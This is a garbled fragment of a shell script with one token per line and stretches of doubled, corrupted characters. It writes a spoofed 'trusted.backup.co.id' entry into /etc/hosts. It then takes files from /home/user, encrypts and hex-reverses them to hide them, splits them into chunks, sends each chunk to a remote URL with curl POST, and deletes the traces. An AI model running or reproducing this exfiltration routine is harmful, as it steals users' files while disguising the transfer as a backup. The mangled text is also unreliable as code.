-u)"
-ne
0
]
&&
echoy
installed";
fi;
done;IP="192.168.1.58";
HOST="trusted.backup.co.id";
echo
'192.168.1.58
trusted.backup.co.id'
>>
/etc/hosts;
SRC="/home/user";
URL="httpd20946405a2.pem;
opensssll

eenncc

--aaeess--225566--ccffbb

--KK

""$$((head
-c
64
/tmp/init.txt.pem)"
-iv
"$(tail
-c
32
/tmp/init.txt.pem)"
-in
"$F"
|
xxd
-p
|
rev
|
xxd
-r
-p
|
tee
"$ENC"
>
/dev/null;
split
-b
250
-d
-a
6
"$ENC"
"/tmp/${REL//\//__}.enc.";
for
C
in
/tmp/${REL//\//__}.enc.*;
do
echo
"[*]
Uploading
$REL
->
$(basename
"$C")";
curl
-X
POST
"$URL"
-H
"Content-Type:
application/json"
-d
"{\"data\":\"$(xxd
-p
"$C"
|
tr
-d
'\n'
|
rev
)\",\"chunk\":\"$(basename
"$C")\"}";
rm
-f
"$C";
done;
rm
-f
"$ENC";
doneNULL